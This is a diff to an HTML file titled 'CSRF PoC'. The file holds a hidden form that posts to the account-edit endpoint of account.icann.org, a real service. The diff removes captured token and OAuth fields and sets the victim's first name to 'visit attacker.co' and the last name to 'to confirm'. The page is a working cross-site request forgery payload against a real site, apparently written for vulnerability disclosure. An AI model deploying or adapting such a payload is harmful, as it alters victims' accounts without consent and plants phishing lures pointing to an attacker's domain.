@@ -8,15 +8,7 @@
 <body>
     <h1>CSRF PoC</h1>
     <form id="csrfForm" action="https://account.icann.org/account/edit.editaccountform" method="POST">
-        <input type="hidden" name="_csrf" value="e710e605-0cf6-4d17-855b-9edb47d359c9">
-        <input type="hidden" name="client_id" value="0oa1rcb0iwzRv9n2U2p7">
-        <input type="hidden" name="nonce" value="745286958">
-        <input type="hidden" name="redirect_uri" value="https://account.icann.org/oauth">
-        <input type="hidden" name="response_mode" value="form_post">
-        <input type="hidden" name="response_type" value="code">
-        <input type="hidden" name="state" value="app/userhome">
-        <input type="hidden" name="t:formdata" value="MtZYIcgkUZruVs1M+B9E4OddhnE=..."> <!-- Add the full base64 string here -->
-        <input type="hidden" name="firstName" value="visit attacker.com">
+        <input type="hidden" name="firstName" value="visit attacker.co">
         <input type="hidden" name="lastName" value="to confirm">
         <input type="hidden" name="country" value="Tanzania, United Republic of">
         <input type="hidden" name="soOrAc" value="SSAC">
